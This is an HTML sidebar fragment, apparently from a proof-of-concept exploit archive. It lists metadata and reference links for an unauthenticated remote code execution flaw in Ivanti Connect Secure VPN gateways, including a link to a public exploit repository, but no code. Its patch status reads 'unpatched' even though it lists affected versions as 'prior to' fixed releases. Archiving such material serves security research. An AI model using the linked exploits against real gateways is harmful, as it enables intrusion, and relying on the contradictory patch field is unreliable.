+<span class="font-mono text-lg font-semibold text-red-500 dark:text-red-400">9.0<span class="text-xs text-zinc-400 dark:text-zinc-600">/10</span></span></div><div class="mt-1.5 h-1.5 w-full overflow-hidden rounded-full bg-zinc-200 dark:bg-zinc-800"><div class="h-full rounded-full bg-red-500" style=width:90%></div></div></div><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">CVE</dt><dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2025-0282</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/network/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Ivanti Connect Secure, Ivanti Policy Secure, Ivanti ZTA Gateways</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Ivanti Connect Secure prior to 22.7R2.5; Policy Secure prior to 22.7R1.2; ZTA Gateways prior to 22.8R2.2</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-17</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-amber-600 dark:text-amber-400">unpatched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/rce/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
+<a href=/tags/stack-overflow/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#stack-overflow</a>
+<a href=/tags/buffer-overflow/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#buffer-overflow</a>
+<a href=/tags/pre-auth/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#pre-auth</a>
+<a href=/tags/unauthenticated/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
+<a href=/tags/vpn/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#VPN</a>
+<a href=/tags/zero-day/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#zero-day</a>
+<a href=/tags/active-exploitation/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#active-exploitation</a>
+<a href=/tags/ivanti/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Ivanti</a>
+<a href=/tags/tls/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#TLS</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://nvd.nist.gov/vuln/detail/CVE-2025-0282 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://nvd.nist.gov/vuln/detail/CVE-2025-0282</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/ target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/watchtowrlabs/CVE-2025-0282 target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/watchtowrlabs/CVE-2025-0282</a></li><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://www.infradead.org/openconnect/ target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.infradead.org/openconnect/</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-zinc-800"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-05-17_ivanti-connect-secure-rce/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+intelseclab/poc-archive</a></div></div></div></aside></article></main><footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800"><div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500"><p class=font-mono>PoC Archive — research artifacts for defensive and educational use only.</p><p class=font-mono>built with <a href=https://gohugo.io class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages</p></div></footer></body></html>
